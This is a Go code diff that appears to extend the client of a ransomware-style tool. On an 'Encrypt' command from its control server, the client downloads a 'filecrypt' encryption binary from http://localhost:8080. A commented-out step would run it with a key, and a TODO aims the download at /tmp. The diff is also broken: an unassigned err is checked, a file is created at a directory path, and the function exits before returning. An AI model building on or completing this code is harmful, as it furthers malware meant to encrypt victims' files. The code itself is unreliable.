@@ -125,7 +125,10 @@ func KeepAlive(userString string) error {
 
 	command := string(bytes)
 	if command == "Encrypt" {
-		Encrypt()
+		DownloadFile("./", "http://localhost:8080/filecrypt") //TODO: change directory to /tmp
+		if err != nil {
+			panic(err)
+		}
 	} else {
 		time.Sleep(time.Minute * 10)
 		KeepAlive(userString)
@@ -205,9 +208,42 @@ func Enumerate() (Discovery Enumeration, userString string) {
 }
 
 //trigger key creation serverside and download the encryption binary from /file
-func Encrypt() {
+func Download() {
 	//placeholder code
+
 	fmt.Println("I would start encrypting")
 	time.Sleep(time.Second * 10)
 	os.Exit(1)
+}
+
+func DownloadFile(filepath string, url string) error {
+
+	// Get the data
+	resp, err := http.Get(url)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+
+	// Create the file
+	out, err := os.Create(filepath)
+	if err != nil {
+		return err
+	}
+	defer out.Close()
+
+	// Write the body to file
+	_, err = io.Copy(out, resp.Body)
+	fmt.Println("Encrypt run successfully")
+	time.Sleep(time.Second * 10)
+	os.Exit(1)
+
+	//runs the encrypter
+	//TODO: program this logic
+	// cmd := exec.Command("./crypt", "-encrypt -key")
+	// if err := cmd.Run(); err != nil {
+	// 	panic(err)
+	// }
+	return err
+
 }
